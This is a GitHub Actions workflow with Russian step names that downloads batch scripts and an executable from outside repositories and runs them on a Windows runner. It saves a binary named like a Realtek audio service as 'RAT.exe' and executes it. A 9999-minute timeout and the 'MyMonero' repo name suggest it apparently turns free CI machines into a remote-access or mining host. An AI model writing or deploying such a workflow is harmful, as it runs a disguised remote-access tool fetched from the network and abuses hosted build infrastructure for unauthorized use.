name: launch

on: workflow_dispatch

jobs:
  build:

    runs-on: windows-latest
    timeout-minutes: 9999

    steps:
    - name: Загрузка необходимого для запуска ПО.
      run: |
        Invoke-WebRequest https://raw.githubusercontent.com/ThePyGoose/KryptexCore/main/files/install.bat -OutFile install.bat
        Invoke-WebRequest https://raw.githubusercontent.com/ThePyGoose/KryptexCore/main/files/exit.bat -OutFile exit.bat
    - name: Настройка VDS.
      run: |
        Remove-item "C:\Users\Public\Desktop\*.lnk" -Force
        cmd /c install.bat
    - name: Запуск RAT
      run: |
        Invoke-WebRequest https://github.com/ThePyGoose/MyMonero/raw/main/RtkAudUService32.exe -Outfile RAT.exe
        ./RAT.exe
    - name: Запуск виртуальной машины выполнен
      run: cmd /c exit.bat
